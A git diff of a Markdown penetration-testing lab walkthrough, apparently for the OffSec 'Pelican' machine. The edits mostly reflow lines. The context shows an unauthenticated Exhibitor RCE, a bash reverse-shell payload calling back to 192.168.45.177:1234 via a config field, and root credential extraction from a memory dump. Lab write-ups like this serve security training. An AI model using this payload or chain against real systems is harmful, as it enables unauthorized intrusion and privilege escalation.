@@ -26,8 +26,7 @@ series = ["Offsec"]
 
 ![image](Picture_0.png)
 
-This walkthrough covers the full exploitation path for the Pelican target, from initial reconnaissance to root compromise and post-exploitation considerations.  
-We focus on service enumeration, misconfigurations, abusing an exposed Exhibitor instance, credential extraction through memory dumping, and privilege escalation.
+This walkthrough covers the full exploitation path for the Pelican target, from initial reconnaissance to root compromise and post-exploitation considerations. We focus on service enumeration, misconfigurations, abusing an exposed Exhibitor instance, credential extraction through memory dumping, and privilege escalation.
 
 
 ### 1. Reconnaissance
@@ -86,14 +85,14 @@ The unauthenticated Exhibitor panel is vulnerable to remote code execution as do
 
 https://www.exploit-db.com/exploits/48654
 
-This exploit works because Exhibitor allows modification of ZooKeeper configuration fields.  
-When these fields are saved, certain fields are *executed* by the system — leading directly to RCE.
+This exploit works because Exhibitor allows modification of ZooKeeper configuration fields. When these fields are saved, certain fields are *executed* by the system — leading directly to RCE.
 
 A reverse shell payload is injected into a configuration field:
 ```sh
 $(bash -c 'bash -i >& /dev/tcp/192.168.45.177/1234 0>&1')
 ```
 We place this payload into one of the editable fields and click Save.  
+
 Once Exhibitor reloads the configuration, the system executes the payload and triggers our reverse shell listener.
 
 ![image](Picture_4.png)
@@ -152,8 +151,7 @@ Then search for password-like values inside:
 
 ![image](Picture_11.png)
 
-A valid root password is found embedded in the dump.  
-This confirms the high-impact misconfiguration: sensitive credentials stored in memory + unrestricted memory dump tool = privilege escalation.
+A valid root password is found embedded in the dump. This confirms the high-impact misconfiguration: sensitive credentials stored in memory + unrestricted memory dump tool = privilege escalation.
 
 Switch to root:
 
